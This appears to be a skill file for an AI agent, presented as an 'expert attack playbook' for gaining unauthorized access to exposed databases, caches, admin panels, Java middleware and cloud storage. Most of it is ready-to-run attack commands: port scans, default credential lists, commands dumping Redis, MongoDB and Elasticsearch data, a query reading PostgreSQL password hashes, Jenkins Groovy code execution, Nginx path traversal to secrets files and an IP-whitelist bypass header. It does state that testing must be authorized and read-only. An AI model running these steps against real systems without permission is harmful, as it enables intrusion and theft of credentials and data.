---
name: unauthorized-access-common-services
description: Unauthorized access triage for exposed common services. Use when testing
  admin panels, databases, caches, message queues, cloud consoles, dev tools, reverse-proxy
  misconfigurations, Nginx off-by-slash, X-Forwarded-For trust, or cloud storage misconfigurations.
---

# SKILL: Unauthorized Access — Common Services — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Exposed service triage covers databases (Redis, MongoDB, MySQL, PostgreSQL, Elasticsearch), caches (Memcached), message queues (RabbitMQ, Kafka), admin panels (Jenkins, Grafana, Kibana, phpMyAdmin, Tomcat Manager), Java middleware (WebLogic, JBoss), reverse proxy mistakes (Nginx off-by-slash, X-Forwarded-For), and cloud storage (S3, GCS, Azure Blob). All testing must be authorized and prefer read-only proof of access.

## QUICK START

### Core Rule

Use only in authorized testing. Prefer read-only proof of access (read config, enumerate users). Do not modify data, delete records, or execute destructive commands.

### First-pass service discovery

```bash
# Quick port scan for common services:
nmap -sV -p 22,80,443,1433,1521,2181,2375,3000,3306,4443,5000,5432,5601,6379,6443,8080,8443,8888,9000,9090,9200,9300,11211,15672,27017,50070 TARGET
```

### High-value service checklist

| Service | Port(s) | What to Check |
|---------|---------|---------------|
| Redis | 6379 | Unauth access, CONFIG GET, INFO |
| MongoDB | 27017 | Unauth access, show dbs |
| Elasticsearch | 9200 | `/_cat/indices`, `/_search` |
| MySQL | 3306 | Default/root creds, empty password |
| PostgreSQL | 5432 | Default/postgres creds |
| Jenkins | 8080, 8443 | Unauth /script, /configure |
| Grafana | 3000 | Default admin:admin |
| Kibana | 5601 | Unauth dashboard access |
| phpMyAdmin | 80, 443 | Default root, no password |
| Tomcat Manager | 8080 | Default tomcat:tomcat |
| WebLogic | 7001 | Default weblogic:weblogic |
| RabbitMQ | 15672 | Default guest:guest |
| Memcached | 11211 | `stats`, `get` commands |

---

## 1. DATABASE SERVICES

### Redis (6379)

```bash
# Connect:
redis-cli -h TARGET

# Unauth check:
INFO
CONFIG GET *
SELECT 1
KEYS *

# Data extraction:
GET secret_key
LRANGE session_list 0 -1
HGETALL users
```

### MongoDB (27017)

```bash
# Connect:
mongo --host TARGET

# Unauth check:
show dbs
use admin
db.users.find()
db.system.users.find()
```

### Elasticsearch (9200)

```bash
# Unauth check:
curl http://TARGET:9200/_cat/indices
curl http://TARGET:9200/_search?pretty
curl http://TARGET:9200/_cluster/health

# Data extraction:
curl http://TARGET:9200/INDEX_NAME/_search?size=100
curl http://TARGET:9200/_all/_search?q=password
```

### MySQL (3306)

```bash
# Default credential check:
mysql -h TARGET -u root -p ''
mysql -h TARGET -u root -p 'root'
mysql -h TARGET -u root -p 'mysql'

# If connected:
SHOW DATABASES;
SELECT user, host FROM mysql.user;
```

### PostgreSQL (5432)

```bash
# Default credential check:
psql -h TARGET -U postgres -W
# Try: postgres, password, empty

# If connected:
\l
SELECT usename, passwd FROM pg_shadow;
```

---

## 2. CACHE AND MESSAGE QUEUE SERVICES

### Memcached (11211)

```bash
# Connect:
nc TARGET 11211

# Commands:
stats
stats items
stats cachedump 1 100
get key_name
```

### RabbitMQ (15672)

```bash
# Default: guest:guest
curl -u guest:guest http://TARGET:15672/api/overview
curl -u guest:guest http://TARGET:15672/api/queues
curl -u guest:guest http://TARGET:15672/api/users
```

### Apache Kafka (9092)

```bash
# List topics:
kafka-topics.sh --list --bootstrap-server TARGET:9092

# Consume messages:
kafka-console-consumer.sh --bootstrap-server TARGET:9092 --topic sensitive-data --from-beginning
```

---

## 3. ADMIN PANELS AND DEV TOOLS

### Jenkins (8080)

```bash
# Check unauth access:
curl http://TARGET:8080/script
curl http://TARGET:8080/configure
curl http://TARGET:8080/credentials/store

# Groovy console RCE (if accessible):
println "id".execute().text
```

Default creds: `admin:admin`, `admin:password`, `jenkins:jenkins`

### Grafana (3000)

```bash
# Default: admin:admin (may prompt password change)
curl http://TARGET:3000/api/admin/settings
curl http://TARGET:3000/api/datasources
# Datasources may contain database credentials
```

### Kibana (5601)

```bash
# Check unauth access:
curl http://TARGET:5601/api/status
curl http://TARGET:5601/app/kibana
# May expose Elasticsearch indices and data
```

### phpMyAdmin

```bash
# Check common paths:
/phpmyadmin/
/pma/
/dbadmin/
/mysql/

# Default: root with no password
```

### Tomcat Manager (8080)

```bash
# Default creds: tomcat:tomcat, admin:admin
# Manager app:
curl http://TARGET:8080/manager/html
# If accessible → deploy WAR → RCE
```

---

## 4. JAVA MIDDLEWARE

### WebLogic (7001)

```bash
# Default: weblogic:weblogic, weblogic:welcome1
# Check console:
curl http://TARGET:7001/console

# T3 protocol:
nmap -sV -p 7001 TARGET

# Known CVE paths:
/wls-wsat/CoordinatorPortType
/uddiexplorer/
```

### JBoss (8080, 9990)

```bash
# Default: admin:admin
# JMX console:
curl http://TARGET:8080/jmx-console/
# If accessible → deploy via JMX → RCE
```

### WebSphere (9043)

```bash
# Default: admin:admin (ibm-webas)
curl https://TARGET:9043/ibm/console
```

---

## 5. REVERSE PROXY MISTAKES

### Nginx Off-by-Slash

```text
# Misconfigured alias:
location /static {
    alias /var/www/app/static/;
}
# Exploit: /static../etc/passwd → /var/www/app/static/../etc/passwd = /var/www/app/etc/passwd
# Try: /static../.env, /static../config.php
```

### X-Forwarded-For Trust

```text
# If application trusts X-Forwarded-For for IP-based access control:
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Real-IP: 127.0.0.1
# May bypass IP whitelist for admin panels
```

### Caddy Template Exposure

```text
# Check for Caddy template rendering:
{{ .Env }}
{{ .Config }}
# May expose environment variables and configuration
```

---

## 6. CLOUD SERVICE EXPOSURE

### AWS S3

```bash
# Check public access:
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/sensitive-file . --no-sign-request
```

### GCP Cloud Storage

```bash
gsutil ls gs://bucket-name/
gsutil cp gs://bucket-name/sensitive-file .
```

### Azure Blob Storage

```bash
az storage blob list --container-name container --account-name account
```

---

## DECISION TREE

```
Port scan reveals exposed services?
├── Database exposed?
│   ├── Redis → try unauth INFO/KEYS
│   ├── MongoDB → try unauth show dbs
│   ├── MySQL/PostgreSQL → default creds
│   └── Elasticsearch → unauth _search
│
├── Admin panel?
│   ├── Jenkins → /script console, default creds
│   ├── Grafana → admin:admin, datasources leak
│   ├── phpMyAdmin → root with no password
│   └── Tomcat → /manager/html, WAR deploy
│
├── Java middleware?
│   ├── WebLogic → T3, console, CVE paths
│   ├── JBoss → JMX console
│   └── WebSphere → admin console
│
├── Proxy misconfiguration?
│   ├── Nginx off-by-slash → path traversal via alias
│   ├── X-Forwarded-For → IP whitelist bypass
│   └── Caddy → template injection
│
└── Cloud storage?
    ├── S3 → public bucket access
    ├── GCS → public object access
    └── Azure Blob → public container access
```

---

## TESTING CHECKLIST

- [ ] Port scan for common service ports
- [ ] Check databases for unauth access (Redis, MongoDB, ES, MySQL, PostgreSQL)
- [ ] Check admin panels for default credentials (Jenkins, Grafana, Tomcat, phpMyAdmin)
- [ ] Check Java middleware exposure (WebLogic, JBoss, WebSphere)
- [ ] Test Nginx off-by-slash path traversal
- [ ] Test X-Forwarded-For IP whitelist bypass
- [ ] Check cloud storage for public access (S3, GCS, Azure Blob)
- [ ] Document all findings with read-only proof

---

## TOOL ADAPTATION

Use only scanners and HTTP tools visible in the current role. A service banner or template hit is an L1 signal; record a formal vulnerability only after a read-only request proves unauthorized access and concrete impact.

---

## RELATED ROUTING

- [SSRF](../ssrf-server-side-request-forgery/SKILL.md) — when internal services are reachable via SSRF
- [Insecure Source Code Management](../insecure-source-code-management/SKILL.md) — when VCS/exposure is found
- [Deserialization](../deserialization-insecure/SKILL.md) — when Java middleware uses deserialization
- [Burp MCP Vuln Check](../burp-mcp-vuln-check/SKILL.md) — when the corresponding external MCP is available

